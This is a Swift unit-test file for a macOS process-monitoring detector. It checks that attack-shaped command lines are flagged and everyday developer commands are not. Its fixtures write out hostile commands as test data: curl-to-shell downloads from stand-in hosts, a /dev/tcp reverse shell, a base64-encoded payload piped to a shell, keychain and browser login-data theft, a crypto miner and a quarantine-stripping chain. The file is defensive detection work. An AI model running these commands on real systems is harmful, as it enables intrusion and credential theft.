import XCTest
@testable import GhostProcessSniperCore

/// Sentinel must catch real attack shapes and stay quiet on everyday
/// developer work. Each case names what it protects.
final class SentinelRulesTests: XCTestCase {
    private var nextPID: Int32 = 5_000

    private func subject(_ name: String, path: String, command: String? = nil, parent: Int32 = 1) -> SentinelSubject {
        nextPID += 1
        return SentinelSubject(
            identity: ProcessIdentity(pid: nextPID, startTimeSeconds: 1_000, startTimeMicroseconds: UInt64(nextPID)),
            parentPID: parent, userID: 501, name: name, executablePath: path,
            commandLine: command ?? path, isSystemProcess: SentinelCatalog.isSystemLocation(path))
    }

    private let chrome = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
    private let terminal = "/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal"

    private func evaluate(_ subject: SentinelSubject, ancestors: [SentinelSubject] = [], exists: Bool = true) -> SentinelEvaluation {
        SentinelRules.evaluate(subject, ancestors: ancestors, fileExists: { _ in exists })
    }

    private func kinds(_ evaluation: SentinelEvaluation, atLeast severity: SentinelSeverity = .notable) -> Set<SentinelSignalKind> {
        Set(evaluation.signals.filter { $0.severity >= severity }.map(\.kind))
    }

    // MARK: - Attack shapes

    func testBrowserStartingAShellThatDownloadsAndRunsCodeIsDangerous() {
        let browser = subject("Google Chrome", path: chrome)
        let shell = subject("zsh", path: "/bin/zsh", command: "/bin/zsh -c curl -fsSL https://evil.example/p.sh | sh", parent: browser.identity.pid)
        let result = evaluate(shell, ancestors: [browser])
        XCTAssertEqual(result.severity, .dangerous)
        XCTAssertTrue(kinds(result).isSuperset(of: [.appSpawnedShell, .downloadAndExecute]))
        XCTAssertEqual(result.contentAncestor?.name, "Google Chrome")
        XCTAssertTrue(result.headline.hasPrefix("Google Chrome started zsh"), result.headline)
    }

    func testBrowserStartingAnyCommandRunnerIsSuspiciousOnItsOwn() {
        let browser = subject("Google Chrome", path: chrome)
        let script = subject("osascript", path: "/usr/bin/osascript", command: "osascript -e 'return 1'", parent: browser.identity.pid)
        XCTAssertEqual(evaluate(script, ancestors: [browser]).severity, .suspicious)
    }

    func testRunnerBetweenBrowserAndToolStillTracesBackToTheBrowser() {
        let browser = subject("Google Chrome", path: chrome)
        let shell = subject("sh", path: "/bin/sh", command: "sh -c whoami", parent: browser.identity.pid)
        let tool = subject("curl", path: "/usr/bin/curl", command: "curl https://example.com", parent: shell.identity.pid)
        XCTAssertTrue(kinds(evaluate(tool, ancestors: [shell, browser])).contains(.appSpawnedShell))
    }

    func testPastedOneLinerFromAnUnencryptedAddressIsSuspiciousWithPasteAdvice() {
        let app = subject("Terminal", path: terminal)
        let shell = subject("-zsh", path: "/bin/zsh", command: "-zsh", parent: app.identity.pid)
        let curl = subject("curl", path: "/usr/bin/curl", command: "curl -s http://45.9.148.21/install | bash", parent: shell.identity.pid)
        let result = evaluate(curl, ancestors: [shell, app])
        XCTAssertEqual(result.severity, .suspicious)
        XCTAssertTrue(result.fromTerminal)
        XCTAssertTrue(result.recommendation.contains("paste"), result.recommendation)
    }

    func testFakePasswordDialogIsFlagged() {
        let dialog = subject("osascript", path: "/usr/bin/osascript", command: #"osascript -e display dialog "Enter your password to continue" default answer "" with hidden answer"#)
        XCTAssertTrue(kinds(evaluate(dialog), atLeast: .suspicious).contains(.passwordPrompt))
    }

    func testReadingABrowserCookieKeyIsDangerous() {
        let tool = subject("security", path: "/usr/bin/security", command: "security find-generic-password -wa 'Chrome Safe Storage'")
        XCTAssertEqual(evaluate(tool).severity, .dangerous)
        XCTAssertTrue(kinds(evaluate(tool)).contains(.credentialAccess))
    }

    func testCopyingBrowserLoginDataIsDangerous() {
        let copy = subject("cp", path: "/bin/cp", command: "cp /Users/me/Library/Application Support/Google/Chrome/Default/Login Data /tmp/ld")
        XCTAssertEqual(evaluate(copy).severity, .dangerous)
    }

    func testReverseShellIsDangerous() {
        let shell = subject("bash", path: "/bin/bash", command: "bash -c bash -i >& /dev/tcp/10.0.0.8/4444 0>&1")
        XCTAssertTrue(kinds(evaluate(shell), atLeast: .dangerous).contains(.reverseShell))
    }

    func testDecodedPayloadPipedToAShellIsSuspicious() {
        let shell = subject("sh", path: "/bin/sh", command: "sh -c echo Y3VybCBldmlsLmNvbQ== | base64 -d | sh")
        XCTAssertTrue(kinds(evaluate(shell), atLeast: .suspicious).contains(.encodedPayload))
    }

    func testMinerInTmpEscalatesToDangerous() {
        let miner = subject("xmrig", path: "/tmp/.x/xmrig", command: "/tmp/.x/xmrig -o stratum+tcp://pool.minexmr.com:4444 --donate-level 1")
        let result = evaluate(miner)
        XCTAssertTrue(kinds(result).isSuperset(of: [.cryptoMiner, .temporaryLocation]))
        XCTAssertEqual(result.severity, .dangerous)
    }

    func testSystemNameFromTheWrongPlaceIsAMasquerade() {
        let fake = subject("launchd", path: "/Users/me/Library/.cache2/launchd")
        XCTAssertTrue(kinds(evaluate(fake), atLeast: .dangerous).contains(.masquerade))
        let real = subject("launchd", path: "/sbin/launchd")
        XCTAssertTrue(evaluate(real).signals.isEmpty)
    }

    func testWritingALaunchAgentIsPersistence() {
        let copy = subject("cp", path: "/bin/cp", command: "cp /tmp/a.plist /Users/me/Library/LaunchAgents/com.update.plist")
        XCTAssertTrue(kinds(evaluate(copy), atLeast: .suspicious).contains(.persistence))
    }

    func testDownloadRunAndQuarantineStripChainIsDangerous() {
        let shell = subject("bash", path: "/bin/bash",
            command: "bash -c curl -o /tmp/u https://files.example/u && xattr -d com.apple.quarantine /tmp/u && chmod +x /tmp/u && /tmp/u")
        XCTAssertEqual(evaluate(shell).severity, .dangerous)
    }

    func testDeletedExecutableIsNoted() {
        let orphan = subject("helperd", path: "/Users/me/Applications/tool/helperd")
        XCTAssertTrue(kinds(evaluate(orphan, exists: false)).contains(.deletedExecutable))
    }

    // MARK: - Staying quiet on normal work

    func testHomebrewInstallerIsOnlyContext() {
        let app = subject("Terminal", path: terminal)
        let shell = subject("bash", path: "/bin/bash",
            command: #"/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)""#,
            parent: app.identity.pid)
        let result = evaluate(shell, ancestors: [app])
        XCTAssertEqual(result.severity, .info)
        XCTAssertTrue(result.signals.contains { $0.kind == .downloadAndExecute })
    }

    func testBrowserHelpersAreNotCommandRunners() {
        let browser = subject("Google Chrome", path: chrome)
        let helper = subject("Google Chrome Helper (Renderer)",
            path: "/Applications/Google Chrome.app/Contents/Frameworks/Google Chrome Framework.framework/Versions/140.0/Helpers/Google Chrome Helper (Renderer).app/Contents/MacOS/Google Chrome Helper (Renderer)",
            command: "--type=renderer --lang=en-US", parent: browser.identity.pid)
        XCTAssertTrue(evaluate(helper, ancestors: [browser]).signals.isEmpty)
    }

    func testEverydayDeveloperCommandsRaiseNothing() {
        let app = subject("Terminal", path: terminal)
        let shell = subject("-zsh", path: "/bin/zsh", command: "-zsh", parent: app.identity.pid)
        let commands: [(String, String, String)] = [
            ("node", "/opt/homebrew/bin/node", "node /Users/me/app/node_modules/.bin/vite --port 3000"),
            ("python3", "/usr/bin/python3", "python3 -m http.server 8000"),
            ("git", "/usr/bin/git", "git pull --rebase"),
            ("cargo", "/Users/me/.cargo/bin/cargo", "cargo build --release"),
            ("rust-analyzer", "/Users/me/.rustup/toolchains/stable/bin/rust-analyzer", "rust-analyzer"),
            ("curl", "/usr/bin/curl", "curl -s https://api.github.com/repos/apple/swift"),
            ("security", "/usr/bin/security", "security find-identity -v -p codesigning"),
            ("xattr", "/usr/bin/xattr", "xattr -l MyApp.app"),
        ]
        for (name, path, command) in commands {
            let process = subject(name, path: path, command: command, parent: shell.identity.pid)
            let result = evaluate(process, ancestors: [shell, app])
            XCTAssertLessThan(result.severity, .notable, "\(command): \(result.signals.map(\.kind))")
        }
    }

    func testChatAppStartingAShellIsOnlyNotable() {
        let slack = subject("Slack", path: "/Applications/Slack.app/Contents/MacOS/Slack")
        let shell = subject("sh", path: "/bin/sh", command: "sh -c ls", parent: slack.identity.pid)
        XCTAssertEqual(evaluate(shell, ancestors: [slack]).severity, .notable)
    }

    func testKnownDeveloperFoldersAreNotHidden() {
        XCTAssertFalse(SentinelRules.isHiddenUserPath("/users/me/.cargo/bin/cargo"))
        XCTAssertFalse(SentinelRules.isHiddenUserPath("/users/me/.local/bin/uv"))
        XCTAssertTrue(SentinelRules.isHiddenUserPath("/users/me/.xq/agent"))
        XCTAssertTrue(SentinelRules.isHiddenUserPath("/users/me/library/application support/.sync/helper"))
    }

    func testEvidenceKeepsOriginalCapitalisation() {
        let signals = CommandPatterns.signals(commandLine: "curl -s HTTP://Example.COM/Run.sh | sh", program: "curl")
        XCTAssertEqual(signals.first { $0.kind == .downloadAndExecute }?.evidence, "HTTP://Example.COM/Run.sh")
    }

    func testSudoPasswordIsRedactedInEvidence() {
        let signals = CommandPatterns.signals(commandLine: "sh -c echo hunter2 | sudo -S rm /tmp/x", program: "sh")
        let evidence = signals.first { $0.kind == .passwordPrompt }?.evidence ?? ""
        XCTAssertFalse(evidence.contains("hunter2"), evidence)
    }
}

extension SentinelRulesTests {
    func testCyrillicLookalikeOfFinderIsAMasquerade() {
        let fake = SentinelSubject(
            identity: ProcessIdentity(pid: 9_001, startTimeSeconds: 1, startTimeMicroseconds: 0), parentPID: 1, userID: 501,
            name: "Fіnder", executablePath: "/Users/me/Library/Caches/Fіnder", commandLine: "Fіnder", isSystemProcess: false)
        let result = SentinelRules.evaluate(fake, ancestors: [], fileExists: { _ in true })
        XCTAssertTrue(result.signals.contains { $0.kind == .masquerade && $0.severity == .dangerous }, "\(result.signals)")
    }

    func testAppDisguisedAsAPDFIsSuspicious() {
        let lure = SentinelSubject(
            identity: ProcessIdentity(pid: 9_002, startTimeSeconds: 1, startTimeMicroseconds: 0), parentPID: 1, userID: 501,
            name: "Invoice", executablePath: "/Users/me/Downloads/Invoice.pdf.app/Contents/MacOS/Invoice",
            commandLine: "Invoice", isSystemProcess: false)
        XCTAssertGreaterThanOrEqual(SentinelRules.evaluate(lure, ancestors: [], fileExists: { _ in true }).severity, .suspicious)
    }

    func testShellWaitingForConnectionsIsDangerous() {
        var shell = SentinelSubject(
            identity: ProcessIdentity(pid: 9_003, startTimeSeconds: 1, startTimeMicroseconds: 0), parentPID: 1, userID: 501,
            name: "bash", executablePath: "/bin/bash", commandLine: "bash", isSystemProcess: true)
        shell.listeningPorts = [4444]
        XCTAssertEqual(SentinelRules.evaluate(shell, ancestors: [], fileExists: { _ in true }).severity, .dangerous)
    }

    func testDevServerListeningIsNormal() {
        var node = SentinelSubject(
            identity: ProcessIdentity(pid: 9_004, startTimeSeconds: 1, startTimeMicroseconds: 0), parentPID: 1, userID: 501,
            name: "node", executablePath: "/opt/homebrew/bin/node", commandLine: "node server.js", isSystemProcess: false)
        node.listeningPorts = [3000]
        XCTAssertLessThan(SentinelRules.evaluate(node, ancestors: [], fileExists: { _ in true }).severity, .notable)
    }
}
